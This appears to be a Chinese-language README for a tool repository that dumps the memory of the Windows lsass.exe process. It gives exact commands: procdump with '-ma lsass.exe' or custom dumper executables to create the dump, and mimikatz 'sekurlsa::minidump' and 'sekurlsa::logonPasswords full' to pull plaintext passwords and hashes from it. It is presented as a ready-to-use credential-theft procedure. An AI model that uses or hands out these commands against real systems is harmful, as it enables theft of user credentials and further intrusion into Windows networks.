# dump_lsass
一个dumpWindows系统lsass.exe进程的工具

dump_lsass_for_Win7_x64.c和dump_lsass_for_Win10_x64.c是国外一位大佬写的lsass.exe进程dump工具，参考链接：https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/

procdump.exe是一个微软官方的进程转储工具，主要用于抓取崩溃进程的内存数据，下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

第1步：转储lsass.exe进程

使用prodump.exe转储（需要管理员权限）

procdump.exe -accepteula -ma lsass.exe lsass_dump

或者使用dump_lsass_for_Win*_x64.exe转储（需要管理员权限）

dump_lsass_for_Win7_x64.exe

dump_lsass_for_Win10_x64.exe

第2步：利用mimikatz读取密码，lsass_dump.dmp为保存dump数据的文件

mimikatz.exe "sekurlsa::minidump lsass_dump.dmp" "sekurlsa::logonPasswords full" exit

